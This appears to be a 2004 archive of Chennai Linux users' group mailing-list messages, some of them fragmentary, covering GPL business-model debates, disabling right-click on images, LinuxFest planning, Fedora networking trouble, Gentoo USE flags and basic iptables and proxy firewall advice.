Do you know that Linux based contributes less than 2% of IBM's revenues.

Take embedded / real time Oses.

Though i don't plan to use it, it aptly describes the status, you code is forced to be released to the community once you use GPL source.

Could you explain why companies maintain 2 versions one for open source community and the other one for for thier commercials.
As you said, if they beleive in GPL, why not sun GPL staroffice ?
i also gave an example of RTlinux

2). Previously some movie websites like alaipauthey.com had the option of downloading pictures but it will not allow right-click and save!!

3). In essence how do we put images in webpages without actually transferring it to the user`s disk??

Kindly help. Reply to: sudharsan@rediffmail.com   ?

  Then put [OT] before the subject text.

  The `img` html tag needs the image location.  The user could easily
get this URL (from the HTML page) and use `wget` to download it.

  Regardless how you restrict it, the user could simply take a
screenshot to get the picture.

  BTW, why do u need to restrict users' from saving webpage pictures?

Just to be on the safe side, do not allow unrestricted access to the
internet (esp. from windows machines).  Set up a -
    1. a dns cache (bind).
    2. a web proxy (squid).
    3. open only pop/smtp ports to your mail server.  Better yet, setup
       a local mail server that will proxy your email.
    4. you can enable yahoo messenger, MSN, ICQ, etc selectively.
    5. specifically enable other traffic like outgoing ssh, etc.
    6. disallow all other traffic.

This setup will effectively block internet worms and other evils from
spreading out from your network.

Btw, it's wise not to mention your public IP address on mailing lists.

Hey Raja!

Thanks for the reply. Let me know the cost of the
following. My order of preference:

(a) A basic 4-port router running NAT (of course)
OR
(b) A wireless 4-port router (with NAT) with 802.11a/b
OR
(c) A wireless 4-port router (with NAT) with Bluetooth
(if possible)

I would also be interested in a used/second-hand
"Linksys WRT54g Wireless Router". I need this for some
testing purposes.

Shankar:
In our discussion today (June 26, 2004) you were
telling me something about making your own router? Did
you refer to converting a system with ethernet cards
into a router or were you referring to making a router
from chipsets?

Let me know,

Thanks Raja and Shankar,

Subject: [Ilugc] Design 1.3 
Message-ID: <20040626180157.12277.qmail@web50206.mail.yahoo.com>

Hi!

I had sent the Design 1.3 earlier as an attachment,
but, since it was a huge file (.sxd), the moderator
didn't approve it I guess. Anyways, I am providing the
link for it now:

http://www.geocities.com/shakthimaan/docs/Design1.3.pdf

Since this is a t-shirt for our ILUGC and not specific
to the LinuxFest, and it requires finances we can
probably keep this as a long-term project depending on
the number of members who are interested in the
t-shirt.

I have asked few of my friends to volunteer for the
LinuxFest. Will let you know in few days time. I can
bring one computer. Still deciding on the demo part.
Will let you know soon.

Another suggestion would be to be specific on the demo
part that each volunteer is displaying. Everyone might
know about firewalls, samba, server setups etc. and
you would have already showed it last year. So, it
would be interesting to show some new
setup/configuration rather than display what is
already there in the HOWTOs or that has already being
implemented or being used in the industry,

My $0.02, 

Take care,

Shaks

If those pictures are so private to you, that you dont want others to keep a
copy of it.. why do you put it on the web at all?? just for getting the mean
pleasure of showing off your ownership of the "valuable" pictures??

Hello Kamban,

I am a little late coming in.

The benefits are :

1. The commercial company takes 20,000 lines 
of code and extend it adding 10,000 lines 
and release the 10,000. Took 20,000 and 
release 10,000, is it not a benefit?

a. The company saved the money to write 
20,000 lines of code from scratch.

b. The 10,000 lines released to the community 
is reviewed by other interested developers 
and the company gets bug reports and fixes 
and improvements. 

c. The company makes money by supplying the 
resultant application and service support. 
Since the initial investment was low (20,000 
lines of free code), they can price only for 
their service and gain a larger market 
share. 

If they had to start from scratch the 
pricing has to be much higher cutting off 
much of the potential customer base.

2. Now take a company who is going to take a 
free ride on the 30,000 lines of code:

a. The get 30,000 lines of code without 
paying a thing.

b. They will try to understand the code (to 
compete with company 1 above) and package it 
to provide their own solution to the market. 
Whatever the changes, bug fixes they made, 
they release back to the community and 
company 1 also gets all of them.

c. Company 1 still has an advantage as the 
original author they understand the 
application better and provide a better 
service.

The better company wins !

If you want an example of company 1 take Red 
Hat and have a look at their history. 
Company 2 is probably Mandrake.

So, what is the problem?

Best regards,


Ma SivaKumar

Hi Siva / Others 

First of all thanks to everybody.
I will send my final findings to this list for approval, before i publish it.

Back to the points

> a. The company saved the money to write 
> 20,000 lines of code from scratch.

Indeed, it is a benefit so that i can save a few months.
 
> b. The 10,000 lines released to the community

> and improvements. 

The trouble starts here, once i release it to the community,
I'am at the receiving end. If my aim is to productize it, it will get a terrible blow. ( Lost for ever )

Why any body buy it from you when your code ( 10,000 lines ) is available freely.

Again why would any body buy it when it is available freely.
The user can just download it ( 20,000 + The company's 10,000 ) either as source code or as a product.
The company's competitiveness is lost for ever.

> 2. Now take a company who is going to take a

Indeed Yes

Same problem again, this companmy fixes issues does enhancements and releases to the communicty again.
Again can be taken free of cost.
What about the enginners who worked on this ? What about thier efforts ?
Again why would anybody buy it from c1 or c2 ?
How the company will survive ?
Inturn how the industry will pick up / generate employment ?

I have seen even developers who contribute to open source in most cases work in a company and do this in spare time.
Why do they do that ? b'cause there is no proper revenue model in open source.


Assume Microsoft opens up it's code. There will be 100 Windows / Office variations / distributions appearing for free download.
What will happen to the industry then ?

My view is that opensource model cannot generate employment.

> c. Company 1 still has an advantage as the 
> original author they understand the

Now why company 1 will make investment again in the product when there are so many open source people surging ahead making it better.
Company 1 will do this when it can generate revenue out of the productto support the enginners / developers. As this won't happen in this model, company 1 is left behind.

The end user Wins, Both companies will struggle after some time.

Can you compare ( revenue wise / employment wise / contribution to the industry / foriegn exchange earnigs etc ) Microsoft / Oracle / SAP / Vxworks / Nucleus etc with
Mandrake and Redhat, MySql, Montavista etc.
You know there are more than 100 companies offering Embedded linux with no one able to make a good profit.
What Happened to Lineo ?
What happened to Mandrake ( struggling )


Thanks

  Microsoft and other proprietory companies make money (without
justice) by selling products that were never made again or never
involve cost.  They make increasing revenue with constant cost.

  Talking about the IT industry, revenue can be logically made from
services not by selling zeroes and ones, which of course you don't
own.

True... This point is accepted and i have capture in my document.
This has to be set right.
For example once you buy a product, the upgrades should be charged less or even can be given free if there are no major changes.
Giving it free and that too the source code is not a solution. 
Still you have to maintain, fix bugs add enhancements right ?

As per my survey, Revenue model from services has not worked out.
Give a an example of such a success.....

most common way this is done is using a stupid javascript that detects and
traps right click.

so, turning off javascript is not rocket science at all

  Unlike the IT industry, usually the seller will incur a cost for
each and every product he sells .. the buyer will have to pay
something back bcoz he gets the product.  Now thinking in terms of
software is a little bit of crazy in the sellers' side.  Making a
software involves just the man hours, no raw materials.  If a company
is about to make revenue by selling software it only cares about the
revenue, not the software quality or knowledge giving because it's
only the free software model where one get all such benefits.  That
said, I guess the only reasonal method of making revenue in IT
industry is through services--you need to work for what you get.  You
should agree that it is only in IT companies employees have little
stress of their work--painless job but attractive salary.

  .. and revenue can be also made by writing software (consulting)
that are needed specifically for individuals or businessess.

ok!! so if u really want it that way,

just add

to make it spit foobar everytime u call uname. u can add it in ur

You could use the `ximian-desktop` package if you need that look.

Gentoo:
  $ emerge ximian-artwork

RPMs:
  $ search for ximian-artwork in rpmfind.net

The package also contains the cursors.

A couple of days back, you were asking who benefits from free software? EVERYBODY benefits from the mere existence of free software.

Treating software as a product and "selling" it, restricts its usage and tramples on users' freedom. We in the free software community feel that respecting user freedom and cooperation is more important than making millions out of "selling" software. We use other means to earn money.

The dependency is like this:
We need freely usable software. -> We may need software companies.
It is not like:
We need software companies -> How do we impose restrictions on software to make this possible.
You are trying to turn the dependency relationship 180 degrees. 

If we can produce sufficient free software without these companies then why worry about them. We in the free software movement have proved that it is possible to produce a enough free software without having to give up our freedom...

> there is no proper revenue model in open source.

Like I said, it is not a problem until we have lots of free software. And we do have lots of free software.

Linux is definitely not against learning 'How-to' of things and that indeed was my question on how-to disable right-clicking if I ever need to protect images(if necessary)!! It was only for the sake of knowing the scripts/funda that goes behind it.

Maybe the only thing I hadn`t added was the '[OT]' to my thread.

JFYI, I`ve got my answers and posted the answers too, so the question is already off the list.Kindly don`t give it shades and drag it on and on!!


>It is sure to piss of the viewer so much that they will never visit >your site again.

Why does the user get so "pissed" off by not being able to save the photoes in my site ?? 

Even if I do disable right-clicking there are no "disturbing" display messages like "If u right-click on this page, a virus will destroy ur system!!" 

Get the simple point,I just wanted to know the funda behind it!!

Hi
  First and foremost , if you post in a mailing list, the reply  has to be
only to the list. Cc ing is not mandatory. Otherwise why post to a list at
all ? No use getting peeved about it.

Well, now let us bring the company 3 into
picture, who is the target customer for the
software application in question.

a. They have the option of downloading the
application with source code for free.

b. Once they do it, they will assign a
 couple of staff to study and understand the
 application and then teach the rest of the
 users in the company how the application
 works.  (training and consulting)

c. When the staff study it, they understand
some do not understand some. What they
realise is they need to make some
modifications in the application so that the
company can use it (customization)

d. To do the modification they unzip the
source and look at 30,000+ lines of code.
They employ a couple of developers to
understand and extend the code.
(customization).

Company 3 just now employed 2 internal staff
to train others in the compay, a few
developers to extend the application. Got
it!

Now take company 4, who is also a target
customer. They do not want to want to
assigne internal staff and hire new staff to
deploy the application and customize to
their needs. They call up company 1 (or 2)
to help them customize, deploy the
application and train the users.

Everybody wins!!!

The industry will become competitive. The
 100 variations will be avialble, the best
 2-3 which provide better customer service,
 updates and good finish will be supported
 by the users. The rest will be me too
 products.

My argument above tries to prove that it can

Because the product is compay 1's brain
 child and it has the better understanding
 about the product. Company 1 will still
 employ engineers to come out with new
 improvements, provide customizations to
 large companies etc.

Yes, The end user also wins. We will not

 they can not use etc.

If you name Microsoft/ Oracle / SAP/
 Vxworks, there is not matching giant in
 open source world. But there are thousands
 of
small/medium sized companies who are close
to the user (customer) and provide a better
service to them. I have not done any study
on them, you are doing it.

If you really want a meaningful study, do
 not focus only on the large visible
 companies, but look at the larger picture
 of the industry.

 Hello all,
 
 I have installed Fedora core 2 in my box, I have configured all the ethernet settings properly, but when the network starts, it says the IP address is already in use when the cabel is plugged. when I unplug and restart the  network the problem doesn't happen and then, i can plug in the network cable  and can be able to connect to the network. 
 
 How can I overcome this problem? Any Ideas?

At First I have thought the ip address may be already in use, but I have
checked the ipaddress also. there is no such ip address exist  in the
network. I have also tried by giving new IPaddress but even though the
problem persists.

can you cat the ifcfg-eth0 file and also check if your dhcp server has a
private lease for the address concerned ?

IPADDR=172.16.1.192
NETMASK=255.255.255.0

Please don't say "Hai" to a hindi speaker ... the meaning there is 
rather different from what you intend.

Hello,
I work when i reboot my system.

This the contents of the file "/etc/sysconfig/network-scripts/ifcfg-eth0":

# Intel Corp.|82557/8/9 [Ethernet Pro 100]
DEVICE=eth0
BOOTPROTO=none
ONBOOT=yes
IPADDR=172.16.1.192
NETMASK=255.255.255.0
NETWORK=172.16.1.0
GATEWAY=172.16.1.10

 I don't know how the problem is solved. But now it is working fine.

Thanks,
Senthil Murugan

There's this rule on usenet / mailing lists that a spelling flame should 
contain at least one spelling misteak :)

set the appropriate permissions for /bin/mail? [in which case people 
could just use cat and pipe the mail to /usr/sbin/sendmail, or do a 
variety of other things]

Sorry for the delayed posting
The meet was attended by about 9 people.

Decisions:
1.Raja will get written confirmation of date within a day or two.
  It will be 99.99% on Jul 10 and 11th. Next week few of us will 
  visit to have a look at the place.
 
2.After this letters will be mailed to city colleges/schools
   -By Raman.
3.emails will be sent to al IT companies - Address to be provided
   by Praven and mail to be sent by Raman
4.Among the people who attended there are only 7 systems and 
  one projector. we need more.
5.If some one can arrange for Monitors alone we could get another
   3 or four systems
6. Roles assigned sofar are
    1. Shaki will handle CD-buring and selling business. However,
       he is very keen on demoing tech stuff. If someone else
       volunteers for CD's he will move to tech side
    2. Sridhar will handle Programming. Of course he needs more
       people
    3. Shiv will look after anything and everything on projector
    4. Vijay will show educational tools. He too needs one more
       person.

Thanks for the update Raman!

We definitely need lot of members and systems to
entertain the BIG public. 15 is very small for a
mailing list with 1000 members.

I am ready to volunteer for installations or any other
troubleshooting help. If others are willing to join,
we can setup a "Troubleshooting Stall". It will be
nice to have some Internet connection so that we can
google.com/linux if needed.

With Shankar who is handling the projector, I can
present or show any demos (graphics/multimedia or
anything eye-catchy) with my laptop (if need be). But,
I'd like to stick to one stall. So, please do confirm
your roles quickly. We should probably put an updated
database in the website giving us information about
who is doing what.

Regards,

K Shakthi

The point the sender had made is I had some "mean pleasure" in showing off "valuable pictures", and I`m sure my Off-topic thread never required such responses when there were ppl who had actually sent me some good info abt. the content like the Javascript funda and the HTML hell page. 

This was the msg:

Rather than sending a Cc(considered 'non'-madatory), the sender had infact had the "mean pleasure" of just posting an unnecessary, hyper double quoted response. The aforesaid reply to my thread wasn`t "valuable" in anyway!!

Try out thinstation.sf.net.  It's pretty amazing stuff... I'm ditching
my hand-rolled diskless distro once I've ironed out all the thinstation
deployment problems.

The other thing I'll be demoing is etherbooting with a bios mod.  I have
an onboard NIC which does not have an eprom/flash socket.  I've modified
the (AMI) bios to include etherboot and it works like a charm.
Etherboot can also be loaded into Award bios based machines.  Please
don't try this at home... I harmed a motherboard in my adventures and
have some stories to tell.

Well., I and many people here consider it kinda annoying when somebody
CCs a reply directly to them coz., anyways they'll get the same mail
from the mailing-list. But sometimes., when you are little bit
forgetful and when your email-client tries to a act a little more
smart, you happen to send a CC to the original poster also. However,
it is not a feature.. rather a side-effect.

Cheers,
Joe

Well.. would you try killing someone just for "educational" sakes??
that was an analogy of your argument. Try to understand the real sense
what the person has to say.

You put content on a web for people to see. You are basically sharing
information. If you are gonna make restrictions in this sharing
process., it definitely pisses people off.

Compiling 'C' programs

you should have 'cc' or 'gcc' compiler in your system

If you have that one you do as follows:
gcc|cc filename.c

this will create the a.out file then in the command
line
just type

$a.out

It will execute the file


Compiling Jave programs

your system should be installed with 'java' and
'javac'

then do as follows

$javac filename.java

To run the executable file

$java filename

If you have any problem further please mail me Thanx

Which distro?

For C program, you need to have gcc (GNU C Compiler)
installed on your system. Try this,

#whereis gcc

If it tells you the path, it is installed. Else, you
can install it from your installation CD.

gcc Tutorial:
http://galton.uchicago.edu/~gosset/Compdocs/gcc.html

For Java, you need to have J2SE installed in your
system. If its installed you will see the path in the
output of:

#whereis java

Conditional dependencies are possible only with a ports based system. 
If a app supports gnome and ncurses frontend for eg., you could get
all 3 possibilties with gentoo (using USE flags but same package),
where in debian you may need 3 seperate .debs

Simply put--apt is too old and welcome to portage.

Basically in package management systems like RPM, DEB the dependencies
are static for a package.  Take abiworld for example.  abiword has
optional gnome support (enabled through --enable-gnome configure
option, by which u can benefit with about dialog, session management
and gnome intergration).  Now consider the debian package for abiword.
 Would you think that package was compiled with gnome support or not? 
In RPMs and Debs this is static - mean either the abiword*.deb was
compiled with gnome support or not.

But in gentoo, you can control this dependency, in this case abiword
*can* depend upon gnome or not.  This is possible since the primary
way of installint a package in gentoo is by compiling it from source. 
Technically this is the concept of USE flags in portage.

To install abiword with gnome support you do
 
  $ USE='gnome' emerge abiword

or if without gnome support,

  $ USE='-gnome' emerge abiword

(USE is an environment variable in the above two statements)

Portage has lot more advantages than just this.

See the gentoo docs (www.gentoo.org) for more information. 
My website contains some links to gentoo resources.

Run proxy  / use NAT (iptables) in the server. And go thru 
the leatest ilugc archive for more info.

Whoaa, What r u talking abt?? It isn`t unfair to actually know how to diable right-clicks................asking for 'how-to' of disabling right clicks is in no-way analogous to killing a person for educational sake!

Hi

Would you be giving demo of linuxbios ( www.linuxbios.org ) related 
stuff. I am interested in knowing more about this. It could be a 
candidate for embedded linux solutions.

I have not used linuxbios.

For embedded devices, I'm more comfortable with -
    1. network boot - etherboot/pxe
    2. solid state storage - compact flash/disk-on-chip

How do you know that your ISP has secured its Router
if they give you a private IP address? 

What about running your multiple services  (domain
names, VPN) on local network and providing access from
the Internet? 

If I am in the same subnet as your 10.0.0.0 network,
will the ISP router allow me to ping your machine? 

Some thoughts,

A bash script could be used to rename or process such files.  In your 
case, it could be:

     #!/usr/bin/bash
     for file in prob.rt.who?pl=*;
     do
       mv $file $file.html
     done


There may be a single line perl or sed command, and those who know it 
may kindly post.

schools in the city. To draw more visitors we can put ad. The Hindu,
brings a special supplement called Downtown, separtely for each part
of the city.
The ad rates are 
North Rs.75 per sq.cm Central:Rs.70 South: Rs.95 Southern
Suburb:Rs.35
North Suburb:Rs.30.

We need a mininum of 4x4cm ie. 16 sq.cm. The cost will work out to
about Rs.1520 for south and Rs.1120 for central(the school may be in
this reqion we need to check up)

If we you all feel it is ok, we will place ad (off course subject to
availability of fund or sponsor)

Is your root partition full?

use 'df -h' to find out.. free up some space and try again.

By the way, this is the problem. On running "emerge PACKAGE", the

to give it a try.

Before that i wanted to know about the reported problems in fedora core 2.
Are there any problems in Fedora core 2 compared to redhat linux 9.0. How
stable it is? Heared there are some networking related issues in FC1. Can
FC2 be used in a production environment. Any security issues?

Any pointers appriciated.

  A better solution is to use the `file` utility to determine which
files are actually HTML (XHTML) and rename accordingly.

It is better to use source based installation.  If time is a
constraint consider setting up your own mirrors within the campus ...
so that packages compiled under one machine can be used by all others
(of same architecture)

Subject: [Ilugc] [LinuxFest] Monitor needed
Message-ID: <20040630095735.72968.qmail@web50201.mail.yahoo.com>

Hi folks!

I am trying to connect a Samtron SC-428PS monitor to
the external video port of my laptop (Thinkpad T41
having ATI 7500). I am able to view the display on the
external monitor, but, the image is at a very low
resolution on the external monitor (640x480 or
800x600) and it doesn't cover the entire screen as can
be seen from:

http://www.geocities.com/shakthimaan/images/image1.jpg

If I move the mouse to the extreme ends of the
display, the screen moves and shows the missed
sections. I did read through the radeon and XF86Config
man pages.

My current /etc/X11/XF86Config file
http://www.geocities.com/shakthimaan/XF86Config

I also found out that this Samtron does only upto
800x600 and hence cannot support the 1024x768. 

If anyone is willing to lend a monitor for 2 days for
the LinuxFest, it will be great. I will first test it
with your monitor and if it works great, I would like
to use it for two days. If you like, you can join me
for a demo. I am trying to setup a "Dual Head" or
"Clone Head" with two displays.

Please reply ASAP,

Thanks,

Shaks

Hello Balachandar,
       RPM doesnot satisfy the dependencies while you
install. For that APT-RPM, a port of Debian's APT tool
is available for RPM based distributions.
       You can use it to easily install, upgrade,
remove packages, satisfying the dependencies
automatically. The installation can be from a local
repository or from the internet.

Actually, I'm really bad at hardware so hats off to these guys. I'm
really in awe of someone who can reverse engineer this stuff and write
device drivers. I think it'll be sometime before all manufacturers open
up to the idea of supporting Linux..especially, as a lot of them are
still queasy about making their device drivers open source. However,
people like Nvidia and Ati are pretty good in this regard.

Actually, that's the same technique a lot of people use, irrespective of
whether they have access to source.If you're good at assembly, you can
do wonders with software like SoftICE. So, in a way, you do have the
code.

BTW, its Windows and not 'Windoze'. You know, the OS which had less CERT
security alerts than other..ahem...operating systems. :-)

Hi!

A majority of the development of open source w.r.t. to interoperability
is the splendid work of reverse engineering. One example is writing
device drivers for various external products. The programmers only know
the brand name, model and chipset. It is the work of reverse engineering
that tells us about the protocols used by the devices to interact with
the systems.

Were the numerous bugs in windoze found (which
continue to exist and are being found) by seeing the
source code? or knowing the internals? No. It was all
simple reverse engineering :)

Detailed info. at

Basically the EU is going to legalize software patents with no
restrictions on what is patentable.


Today there is a protest march in Brussels.

Currently a whole lot better than the US/EU. Both wrt. copyright and
patents. But the key word is currently. I remember reading that in 
2005 India is set to enter into some WTO agreement which would require
implementing the same ridiculous and draconian laws that the US 
pioneered.

Try to make the default policy DROP and open only those ports u want ( 
22 in ur case).

iptables -P INPUT DROP
iptables -A INPUT -i eth0 -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -i eth0 -p udp --dport 22 -j ACCEPT

Make sure to open them for ur LAN too.
